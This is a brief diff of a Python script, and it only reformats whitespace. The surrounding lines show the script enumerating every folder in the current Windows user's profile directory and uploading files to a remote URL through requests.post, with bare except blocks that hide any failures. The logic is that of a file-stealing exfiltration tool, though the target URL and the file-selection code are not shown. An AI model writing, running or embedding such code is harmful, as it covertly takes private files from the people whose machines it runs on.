@@ -5,7 +5,6 @@ from os import listdir
 
 user = os.environ.get("USERNAME")
 path = f'C:/Users/{user}/'
-    
 
 for folder in listdir(f'C:/Users/{user}'):
     current = path + folder
@@ -19,5 +18,5 @@ for folder in listdir(f'C:/Users/{user}'):
                 r = requests.post(url, files=files)
             except:
                 ...
-   except:
+    except:
         ...
